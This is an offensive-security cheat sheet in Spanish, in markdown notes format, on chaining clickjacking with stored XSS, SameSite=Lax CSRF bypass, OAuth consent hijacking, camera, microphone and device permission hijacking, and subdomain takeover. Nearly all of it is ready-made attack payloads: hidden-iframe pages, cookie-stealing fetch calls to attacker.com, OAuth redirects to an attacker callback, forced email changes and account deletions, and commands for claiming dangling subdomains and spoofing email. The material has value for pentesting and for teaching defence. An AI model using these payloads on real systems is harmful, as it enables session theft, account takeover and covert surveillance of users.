---
aliases:
  - Clickjacking Chains
  - UI Redress Chains
  - Self-XSS to Stored
  - SameSite Lax Bypass
tags:
  - type/technique
  - vuln/clickjacking
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Clickjacking]]'
  - '[[Cross-Site Scripting (XSS)]]'
  - '[[Cross-Site Request Forgery (CSRF)]]'
  - '[[OAuth 2.0 Misconfigurations]]'
  - '[[Subdomain Takeover]]'
---
# Clickjacking - Chains con Otras Vulns

***

## Self-XSS → Stored XSS

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<iframe src="https://victim.com/profile/edit?bio=%3Csvg%2Fonload%3Dfetch(%27%2F%2Fattacker.com%2Fc%3F%27%2Bdocument.cookie)%3E" style="opacity:0.0001;..."></iframe>` + decoy button | Pre-fill bio con XSS + click submit | Self-XSS → Stored. |
| `<iframe src="https://victim.com/comment/new?body=%3Cimg%20src%3Dx%20onerror%3Dfetch(%27%2F%2Fattacker.com%27)%3E" style="opacity:0.0001"></iframe>` | Pre-fill comment con XSS | Comment stored. |
| `<iframe src="https://victim.com/settings?name=%3Cscript%20src%3D%2F%2Fattacker.com%2Fxss.js%3E%3C%2Fscript%3E"></iframe>` | Pre-fill name field stored | Profile stored. |
| `<iframe srcdoc='<form action=https://victim.com/profile/edit method=POST><input name=bio value="<svg/onload=fetch(\"//attacker.com/?c=\"+document.cookie)>"></form><script>document.forms[0].submit()</script>'></iframe>` | Auto-submit form en srcdoc | srcdoc auto-submit. |
| `<form action="https://victim.com/profile/edit" method="POST" target="iframe1"><input name="bio" value="<svg/onload=...>"></form><iframe name="iframe1" style="opacity:0.0001"></iframe>` | Form target iframe auto-submit | Form target. |
| `<iframe src="https://victim.com/admin/users?action=add&name=<script>...</script>" style="opacity:0.0001"></iframe>` + decoy "Confirm Yes" | Admin XSS via clickjack | Admin XSS. |
| `<iframe src="https://victim.com/graphql?query=mutation{createPost(body:\"<svg/onload=...>\")}"></iframe>` | GraphQL mutation pre-fill | GraphQL stored. |
| `<iframe src="https://victim.com/comment" style="opacity:0.0001"></iframe><script>window.addEventListener('message',e=>fetch('//attacker.com/?d='+btoa(e.data)))</script>` | postMessage XSS combo | postMessage XSS. |
| Multi-iframe chain: `<iframe src="...?step=1"><iframe src="...?step=2"></iframe></iframe>` + decoys | Multi-step submit cascade | Complex chain. |
| `<iframe src="https://victim.com/profile/edit?bio=PAYLOAD&csrf=$(curl -s https://victim.com/csrf -b cookies)" style="opacity:0.0001"></iframe>` | CSRF token pre-fetched | CSRF token leak. |
| `<iframe src="https://victim.com/admin/grant?user=attacker&role=admin" style="opacity:0.0001"></iframe>` + decoy click | Direct admin grant clickjack | Privesc. |
^cj-chain-xss

### Workflow Self-XSS → Stored

```html
<!DOCTYPE html>
<html>
<head>
<style>
  iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.001; z-index:2; }
  .decoy { position:absolute; top:200px; left:300px; z-index:1; padding:20px; background:red; color:white; }
</style>
</head>
<body>
  <div class="decoy">¡PREMIO! Click para reclamar</div>
  <iframe src="https://victim.com/profile/edit?bio=%3Csvg%2Fonload%3Dfetch(%27%2F%2Fattacker.com%2Fc%3F%27%2Bdocument.cookie)%3E"></iframe>
</body>
</html>
```

___

## SameSite=Lax CSRF Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<a href="https://victim.com/account/delete?confirm=true" target="_top">CLAIM PRIZE</a>` (clickjack the anchor) | GET endpoint top-level nav cookies flow under Lax | Lax GET bypass. |
| `<form action="https://victim.com/email/change" method="POST" target="topnav"><input name="email" value="attacker@evil.com"><button>Submit</button></form><iframe name="topnav" style="opacity:0.0001;..."></iframe>` | Form target named iframe top-context | Form target trick. |
| `<button onclick="window.open('https://victim.com/account/delete?confirm=true')">Win</button>` (window.open top-level) | window.open top-level nav cookies flow | window.open. |
| `<a href="https://victim.com/admin/x" target="_blank">click</a>` (clickjack anchor) | New tab top-level Lax allowed | Anchor target_blank. |
| `<meta http-equiv="refresh" content="0;url=https://victim.com/account/delete?confirm=true">` (post-form-submit) | Meta refresh top-level redirect | Meta redirect. |
| `<form action="https://victim.com/transfer" method="POST" target="_top"><input name="amount" value="10000"></form>` + decoy click | Form target _top forces top-level | _top target. |
| `curl -I https://victim.com/api/x -c cookies.txt -b cookies.txt \| grep -i samesite` | Pre-attack identify SameSite config | Pre-attack. |
| `<iframe src="https://victim.com/oauth/authorize?...&response_type=token" style="opacity:0.0001"></iframe>` (Lax allows GET OAuth) | Lax-allowed OAuth GET | OAuth combo. |
| `<a href="https://victim.com/transfer?to=attacker&amount=1000">Click for prize</a>` (GET CSRF + Lax) | GET endpoint CSRF Lax-allowed | Standard GET CSRF. |
| `<button onclick="location='https://victim.com/admin/x?confirm=1'">Win</button>` (top-level set location) | location top-level nav | Location set. |
^cj-chain-csrf

### Workflow SameSite=Lax bypass

```html
<form action="https://victim.com/email/change" method="POST" target="topnav">
  <input name="email" value="attacker@evil.com">
  <input type="submit" id="hidden-submit">
</form>
<iframe name="topnav" style="opacity:0.001;position:absolute;z-index:2;width:100%;height:100%"></iframe>
<button class="decoy" style="position:absolute;top:200px;left:300px;z-index:1">Click ganador</button>
<script>
  document.querySelector('.decoy').onclick = () => document.forms[0].submit();
</script>
```

___

## OAuth Consent Hijacking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI 'https://victim.com/oauth/authorize?client_id=X' \| grep -iE 'x-frame-options\|frame-ancestors'` | Probe OAuth endpoint XFO/CSP | Pre-attack probe. |
| `<iframe src="https://victim.com/oauth/authorize?client_id=ATTACKER_CLIENT&redirect_uri=https://attacker.com/cb&response_type=code&scope=admin" style="opacity:0.0001;..."></iframe>` + decoy "Authorize" | Atacante's client + clickjack Authorize | OAuth code theft. |
| `<iframe src="https://victim.com/oauth/authorize?client_id=ATTACKER&redirect_uri=https://attacker.com/cb&response_type=token&scope=all" style="opacity:0.0001"></iframe>` | Implicit flow token theft | Implicit flow. |
| `<iframe src="https://victim.com/oauth/authorize?client_id=PRE_CONSENTED&redirect_uri=https://attacker.com/cb&response_type=code&prompt=none" style="opacity:0.0001"></iframe>` | Silent re-consent already-granted scopes | Silent grant. |
| `<iframe src="https://victim.com/oauth/authorize?...&scope=read write admin" style="opacity:0.0001"></iframe>` | Scope upgrade silent re-consent | Scope upgrade. |
| Register atacante OAuth client → set redirect_uri https://attacker.com/cb → frame /authorize | Atacante OAuth client setup pre-attack | Setup. |
| `<iframe src="https://victim.com/oauth/authorize?client_id=PRE_CONSENTED&redirect_uri=https://attacker.com/cb&response_type=code" sandbox="allow-forms" style="opacity:0.0001"></iframe>` | Sandbox + pre-consented click | Pre-consented chain. |
| `<a href="https://victim.com/oauth/authorize?client_id=ATTACKER&redirect_uri=https://attacker.com/cb&response_type=code" target="_top">Login with Victim</a>` (top-level) | Top-level redirect OAuth | Top-nav. |
| `<button onclick="window.open('https://victim.com/oauth/authorize?...&display=popup',_'oauth')">Authorize</button>` | Popup OAuth clickjack window | Popup variant. |
| `nuclei -t http/misconfiguration/oauth-clickjacking.yaml -u https://victim.com` | Nuclei OAuth XFO probe | Auto detect. |
^cj-chain-oauth

___

## WebRTC getUserMedia Hijack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<iframe src="https://meet.victim.com/join?room=X" style="opacity:0.0001"></iframe>` + decoy "Click to play game" | Jitsi/Meet clickjack join with video | Video conferencing. |
| `<iframe src="https://victim.com/video-call/start" allow="camera; microphone" style="opacity:0.0001"></iframe>` (allow attr required) | Custom WebRTC permission UI clickjack | Custom UI. |
| `<button onclick="navigator.mediaDevices.getDisplayMedia()">Share Screen</button>` (clickjack screen share) | getDisplayMedia screen capture | Screen share. |
| `<iframe src="https://victim.com/recorder" allow="camera; microphone; display-capture" style="opacity:0.0001"></iframe>` | Multi-permission iframe | Multi-perm. |
| `curl -sI https://meet.victim.com/ \| grep -i permissions-policy` | Check Permissions-Policy header | Defense check. |
| `<iframe src="https://victim.com/permissions/restore" style="opacity:0.0001"></iframe>` (post-revoke re-permission) | Silent re-grant after revoke | Re-permission. |
| `<button onclick="navigator.bluetooth.requestDevice({acceptAllDevices:true})">Pair</button>` (BT pairing click) | Bluetooth Web API pairing clickjack | BT pairing. |
| `<button onclick="navigator.usb.requestDevice({filters:[]})">Connect USB</button>` (USB click) | WebUSB device click | WebUSB. |
| `<button onclick="navigator.permissions.query({name:'camera'}).then(p=>p.state==='prompt'&&navigator.mediaDevices.getUserMedia({video:true}))">Continue</button>` | Conditional permission request | Conditional. |
| Mobile WebView test: `adb shell` → load page con getUserMedia in custom WebView | Mobile WebView WebRTC clickjack | Mobile. |
| `<iframe src="https://victim.com/check-mic" allow="microphone" style="opacity:0.0001"></iframe>` | Mic-only iframe permission | Mic-only. |
^cj-chain-webrtc

___

## Subdomain Takeover Trust Transfer

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json` | Discover dangling CNAMEs | Discovery. |
| `subfinder -d victim.com -all -recursive \| dnsx -resp -cname \| grep -iE 'herokuapp\|github.io\|s3.amazonaws\|azurewebsites'` | Bulk CNAME enum for takeover | Bulk discover. |
| `nuclei -t http/takeovers/ -l subs.txt` | Nuclei takeover templates | Auto detect. |
| `heroku create dangling-sub-victim && heroku domains:add dangling.victim.com` | Claim Heroku dangling CNAME | Heroku claim. |
| `aws s3 mb s3://dangling.victim.com` | Claim S3 dangling | S3 claim. |
| `git init pages-claim && cd pages-claim && echo "frontmatter" > index.md && git remote add origin git@github.com:attacker/pages-claim.git && git push -u origin main && gh repo edit --custom-domain dangling.victim.com` | Claim GitHub Pages dangling | Pages claim. |
| `<iframe src="https://victim.com/admin" style="opacity:0.0001"></iframe>` (host en claimed sub since `frame-ancestors 'self'` allows same eTLD+1) | Frame parent post-takeover | Frame after claim. |
| `<script>document.cookie='session=ATTACKER;Domain=.victim.com'</script>` (host en claimed sub) | Cookie tossing parent scope | Cookie tossing. |
| `curl 'https://victim.com/oauth/authorize?client_id=X&redirect_uri=https://dangling.victim.com/cb'` (wildcard redirect_uri abuse) | OAuth redirect_uri wildcard victim sub | OAuth combo. |
| `<iframe src="https://dangling.victim.com/clickjack.html"></iframe>` (loaded by victim CSP wildcard sub) | CSP wildcard sub framing | CSP wildcard. |
| `certbot certonly --standalone -d dangling.victim.com` | Valid TLS cert claimed sub | Legit-look. |
| Email spoof setup: `dig TXT victim.com` (check SPF) + `swaks --from attacker@dangling.victim.com --to victim@victim.com` | DKIM/SPF inherit email spoof | Email spoof combo. |
| `<form action="https://dangling.victim.com/log" method="POST">...</form>` (host en claimed sub) | Form action sub-trust | Form trust. |
^cj-chain-subtakeover

***
